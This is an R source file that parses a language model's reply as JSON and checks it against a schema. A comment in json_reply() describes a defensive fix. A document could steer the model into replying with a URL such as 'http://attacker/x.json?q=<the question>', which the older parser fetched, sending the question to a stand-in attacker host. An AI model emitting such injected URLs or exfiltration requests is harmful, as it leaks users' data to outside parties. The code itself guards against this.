# core-transport-json.R: a model reply read as JSON.

#' A schema reply's text, parsed, and whether a caller can use it.
#' @noRd
json_reply <- function(text, schema = NULL, allow_empty = FALSE) {
  # parse_json(), never fromJSON(). Given a short string that is not valid
  # JSON, fromJSON() treats it as a LOCATION: text starting http:// or https://
  # is downloaded, and a path that exists is opened. This text is the model's
  # reply, which a document can steer, so a reply of
  # "http://attacker/x.json?q=<the question>" made this machine send that
  # request and then recorded whatever came back as the model's decision, and a
  # reply naming a FIFO hung the run. parse_json() only parses; with
  # simplifyVector = TRUE it simplifies exactly as fromJSON() did. Its warning
  # about an unpaired surrogate is quieted: the string is repaired below.
  parse <- function(txt) tryCatch(suppressWarnings(jsonlite::parse_json(txt, simplifyVector = TRUE)),
                                  error = function(e) NULL)
  text <- as_chr1(text)
  val <- parse(text)
  if (is.null(val)) {
    # Some endpoints wrap JSON in a code fence even under strict mode.
    stripped <- gsub("^\\s*```(?:json)?\\s*|\\s*```\\s*$", "", text, perl = TRUE)
    val <- parse(stripped)
  }
  # A "\udc00" escape (half of a split emoji) decodes to bytes that are not
  # UTF-8, and the first regex a reader ran on the value stopped the whole
  # document. Only walked when the reply has a surrogate escape at all.
  if (!is.null(val) && grepl("\\\\u[dD][89a-fA-F]", text)) val <- repair_utf8_deep(val)
  # A bare 7, "text", [1,2,3] or true is valid JSON but not an object. Callers
  # index into `value` with `$`, which errors on an atomic vector, so anything
  # that is not a named list is treated as a parse failure and routed to the
  # reader's documented degraded path instead.
  ok <- !is.null(val) && (is.list(val) || is.data.frame(val))
  ok <- ok && if (isTRUE(allow_empty)) empty_or_schema_object(val, schema)
              else length(names(val)) > 0
  list(ok = ok, value = if (ok) val else NULL)
}

#' Under `allow_empty`: is this reply `{}`, or an object using the schema's
#' own field names?
#'
#' `allow_empty` is for the one caller where `{}` is a real answer rather than a
#' broken one: `extract` asks each chunk what it can fill and an excerpt that
#' can fill nothing is a finding. Without it the empty object was routed to the
#' failure path, so a document that simply did not discuss the schema came back
#' with every chunk counted as a failed call and the answer marked partial --
#' reporting "we could not read this" for "it does not say".
#'
#' But it let through every other shape as well. A reply that wrapped its
#' fields (`{"extraction": {...}}`), renamed them, or was an array filled
#' nothing, since the reader reads the schema's names, and was then recorded as
#' that same complete negative, partial = FALSE, with no failed call: the mix-up
#' this exists to prevent, the other way round. Strict schemas rule those out,
#' but a gateway that ignores strict mode, or a backend that sends no schema,
#' does not. So an object must be empty or name at least one of the schema's
#' properties; anything else is a call that failed.
#' @noRd
empty_or_schema_object <- function(val, schema) {
  # `{}` parses to a NAMED empty list, `[]` to an unnamed one.
  if (is.data.frame(val) || !is.list(val) || is.null(names(val))) return(FALSE)
  if (!length(val)) return(TRUE)
  props <- names(if (is.list(schema)) schema[["properties", exact = TRUE]])
  !length(props) || any(names(val) %in% props)
}
